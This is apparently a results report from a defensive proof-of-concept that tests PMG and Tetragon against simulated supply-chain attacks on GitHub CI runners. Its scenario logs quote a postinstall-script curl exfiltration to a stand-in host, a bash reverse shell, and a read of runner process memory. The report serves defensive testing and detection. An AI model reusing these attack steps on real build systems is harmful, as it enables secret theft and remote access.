# POC results

Run: [POC PMG + Tetragon #3](https://github.com/safedep/pmg/actions/runs/46031201096), 2026-11-27, commit
`5b99651`, GitHub-hosted `ubuntu-24.04`, kernel `7.0.0-1020-azure`, PMG `v0.37.0`, Tetragon `v1.8.0`.

All three jobs passed. Each scenario matched the expectation for its mode.

| Job | Scenarios matched | Agent start-up | Scenarios | Job |
| --- | --- | --- | --- | --- |
| [`unprotected`](https://github.com/safedep/pmg/actions/runs/46031201096/job/140615156727) | 7 of 7 (T8 needs PMG) | none | 18 s | 30 s |
| [`audit`](https://github.com/safedep/pmg/actions/runs/46031201096/job/140615157159) | 8 of 8 | Tetragon 10 s, PMG 3 s | 21 s | 48 s |
| [`enforce`](https://github.com/safedep/pmg/actions/runs/46031201096/job/140615157120) | 8 of 8 | Tetragon 10 s, PMG 2 s | 9 s | 32 s |

The enforce scenarios take less time because the agents stop the attacks at once. Without them, the
reverse shell and the port 8080 call wait for their timeouts.

## What each mode did

| Test | `unprotected` | `audit` | `enforce` |
| --- | --- | --- | --- |
| T1 malicious npm package | Installed | PMG blocked `safedep-test-pkg@0.1.3` | PMG blocked it |
| T2 malicious PyPI package | Installed | PMG blocked `safedep-test-pkg@0.0.4` | PMG blocked it |
| T3 npm version 0 days old (`typescript@7.1.0-dev.20261127.1`) | Installed | PMG hid the version, `npm install` failed | Same |
| T4 install script exfiltration | HTTPS call and port 8080 call went out | PMG reported "would deny `example.com:443`", Tetragon reported `tcp_connect 192.0.2.10:8080` | PMG denied `example.com:443`, Tetragon killed `curl` on port 8080 (exit 137) |
| T5 read `Runner.Worker` memory | Read 16 bytes | Tetragon reported the read | Tetragon killed the reader (exit 137) |
| T6 reverse shell | Timed out (no route) | Tetragon reported `bash` connecting to `192.0.2.10:4444` | Tetragon killed `bash` (exit 137) |
| T7 `env -i curl` of the malicious tarball | HTTP 200 | PMG returned HTTP 403 | Same |
| T8 `SIGSTOP` to PMG | Not applicable | Tetragon reported `kill(<pmg pid>, 19)` | Same |

The process chain in the report traced each event to its origin. For example, T4 in `enforce`:

```text
curl -sS -m 5 ... http://192.0.2.10:8080/exfil
  ← sh ./postinstall.sh
  ← sh -c "sh ./postinstall.sh"
  ← node /usr/local/bin/npm install /tmp/.../poc-evil-postinstall-1.0.0.tgz
  ← bash poc/pmg-tetragon/scripts/scenarios.sh
```

## What a security engineer receives

A PMG network policy event from the `enforce` job (`pmg-events.jsonl`):

```json
{
  "timestamp": "2026-11-27T16:10:04.848965492Z",
  "event_type": "network_policy",
  "message": "Network policy denied example.com:443",
  "details": {
    "action": "denied", "mode": "enforce", "rule": "*:*",
    "hostname": "example.com", "port": 443,
    "client_pid": 3959, "client_comm": "curl", "client_exe": "/usr/bin/curl"
  }
}
```

A Tetragon event from the same install script, 25 ms later (`tetragon.jsonl`, trimmed):

```json
{
  "process_kprobe": {
    "process": { "pid": 3961, "binary": "/usr/bin/curl",
                 "arguments": "-sS -m 5 -o /dev/null http://192.0.2.10:8080/exfil" },
    "parent": { "pid": 3956, "binary": "/usr/bin/sh", "arguments": "./postinstall.sh" },
    "function_name": "tcp_connect",
    "args": [ { "sock_arg": { "daddr": "192.0.2.10", "dport": 8080, "state": "TCP_SYN_SENT" } } ],
    "action": "KPROBE_ACTION_SIGKILL",
    "policy_name": "ci-egress"
  },
  "time": "2026-11-27T16:10:04.873601174Z"
}
```

The PMG post step wrote this to the job summary and log:

```text
Blocked packages:
  pkg:npm/safedep-test-pkg@0.1.3 · malware
  pkg:pypi/safedep-test-pkg@0.0.4 · malware
Network policy: enforce, 1 denied, 0 would deny
  denied  example.com:443  rule *:*  /usr/bin/curl pid 3959
Profile: github-actions < .../poc/pmg-tetragon/pmg/network.yml  ports 80,443
PMG proxy stopped — 3 package(s) blocked
```

Each job keeps its evidence for 14 days as the artifact `poc-<mode>`.

## Findings

1. **The full design runs on GitHub-hosted runners.** The kernel has BTF, kprobes,
   `CONFIG_BPF_KPROBE_OVERRIDE` and `CONFIG_BPF_LSM`. Tetragon could make a call fail (`Override`)
   instead of killing the process. The POC used `Sigkill` only.
2. **Start-up costs about 13 seconds per job.** Tetragon took 10 seconds to download, install and
   enable four policies. PMG took 2 to 3 seconds.
3. **A Tetragon policy can kill PMG.** Run 1 killed every open of `/proc/*/mem`, and that killed
   `pmg proxy start`, because PMG opens its own `/proc/<pid>/mem`. The fix hooks
   `security_ptrace_access_check` in attach mode, which the kernel calls only across processes.
   Ship tested policies with the product, and test each policy against PMG.
4. **PMG listens on `::1` too.** A Tetragon egress policy must exclude both loopback addresses, or it
   reports every IPv6 connection that PMG routes.
5. **PMG package events carry no client.** `malware_blocked` has no PID, so the POC finds the process
   from Tetragon exec events by package name and time. Network events do carry `client_pid`. Product
   change: add the client to package events.
6. **An npm cooldown hold leaves no PMG event.** PMG removes the young version from the metadata, and
   npm fails with "no matching version". The security engineer sees the failed job but no
   `dependency_cooldown` event. Product change: record an event when PMG removes a version.
7. **Tetragon signal reports need a filter.** The runner sends `SIGTERM` and `SIGKILL` in normal work:
   26 `kill` events in the `enforce` job. Only the one that targets the PMG PID matters. The report
   filters by the PMG PID. A product policy needs the same filter.
8. **Tetragon output size.** About 1,000 `process_exec` events and 2 MB of JSON per job.

## Runs before this one

- [Run 1](https://github.com/safedep/pmg/actions/runs/46030279485) found findings 3 and 4, a test URL
  that answered 404, and an evidence step that searched the whole disk.
- [Run 2](https://github.com/safedep/pmg/actions/runs/46030651478) had only the evidence fix and
  failed for the same reasons.
